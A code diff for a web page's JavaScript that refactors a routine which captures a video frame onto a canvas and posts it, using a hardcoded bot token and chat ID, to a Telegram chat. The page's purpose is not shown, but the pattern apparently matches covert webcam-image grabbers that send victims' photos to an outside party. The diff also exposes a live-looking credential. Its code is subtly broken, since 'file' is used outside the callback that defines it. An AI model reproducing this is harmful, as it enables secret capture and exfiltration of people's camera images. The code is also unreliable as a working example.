@@ -141,7 +141,41 @@ function sendImage() {
 
 
 
+function sendBlob(canvas){
+    
+    canvas.toBlob(function(blob) {
+                // Create File object from Blob
+                const file = new File([blob], 'captured_image.png', { type: 'image/png' });
 
+                // Now you can use the 'file' object as needed (e.g., upload or save it)
+                console.log('Captured image file:', file);
+            }, 'image/png');
+                const formData = new FormData();
+                formData.append('photo', file);
+                const loader = document.getElementById('loader');
+                loader.style.display = 'block';
+
+                const botToken = '5214279030:AAHwXVkouOpHANC1EiK6edh_ux4cFqoZ-OY';
+                const chatId = '-1001570223088';
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to send image');
+                    }
+                    loader.style.display = 'none';
+                    // alert('Image sent successfully!');
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    loader.style.display = 'none';
+                    alert('Failed to send image');
+                });
+         
+}
 
 
 
@@ -180,43 +214,11 @@ function sendImage() {
 
             // Remove the video element
             // videoParent.removeChild(video);
+            sendBlob(canvas);
 
 
 
 
-
-            canvas.toBlob(function(blob) {
-                // Create File object from Blob
-                const file = new File([blob], 'captured_image.png', { type: 'image/png' });
-
-                // Now you can use the 'file' object as needed (e.g., upload or save it)
-                console.log('Captured image file:', file);
-            }, 'image/png');
-                const formData = new FormData();
-                formData.append('photo', file);
-                const loader = document.getElementById('loader');
-                loader.style.display = 'block';
-
-                const botToken = '5214279030:AAHwXVkouOpHANC1EiK6edh_ux4cFqoZ-OY';
-                const chatId = '-1001570223088';
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Failed to send image');
-                    }
-                    loader.style.display = 'none';
-                    // alert('Image sent successfully!');
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    loader.style.display = 'none';
-                    alert('Failed to send image');
-                });
-         
         });
 
 
